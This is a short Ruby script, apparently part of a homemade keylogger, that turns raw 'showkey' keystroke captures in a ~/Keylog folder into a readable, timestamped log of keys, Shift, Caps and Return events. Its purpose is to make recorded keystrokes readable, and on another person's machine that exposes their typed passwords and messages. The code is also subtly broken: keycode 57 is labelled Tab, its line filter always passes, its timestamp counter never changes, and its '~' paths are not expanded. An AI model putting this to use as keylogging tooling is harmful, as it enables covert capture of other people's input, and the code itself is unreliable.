#log

require 'date'

t = Time.now
time = t.strftime("%d-%m-%Y %I:%M:%S")
#puts "#{time}"
a = Array.new(88)
lines = IO.readlines("~/Keylog/keymaps.txt")
lines.each do |line|
  if line[0] == "k" #starts with keycode
    a.insert(line[8,2].to_i,line[12..-1])
    a.pop
  end
end
#puts "#{a[0]}"

fin = IO.readlines("~/Keylog/showkey.txt")

fo = File.open("~/Keylog/output.txt","a")
fo.write " ===*===Start Parsing from showkey.txt===*=== \n "
num = 0

def write(line, fo, num, a)
  num = line[9,2].to_i
  key = a[num]
  if ((num==42 || num==54) && line[12,5] == "press") then fo.write "<Shift pressed>\n"
  elsif (num==58 and line[12,5] == "press") then fo.write "<Caps pressed>\n"
  elsif (num==28 and line[12,7] == "release") then fo.write "<Return>\n"
  elsif (num==57 and line[12,7] == "release") then fo.write "<Tab>\n"
  elsif ((num==42 || num==54) && line[12,7] == "release") then fo.write "<Shift released>\n"
  elsif (num==58 and line[12,7] == "release") then fo.write "<Caps released>\n"
  elsif line[12,7] == "release" then fo.write "#{key}\n"
  else fo.write "\n"
  end
end

fin.each do |line|
  if line[0,5] <=> "keyco"
    if num == 0
      fo.write "#{time} : "
      write(line, fo, num, a)
    else
      write(line, fo, num, a)
    end
  end
end
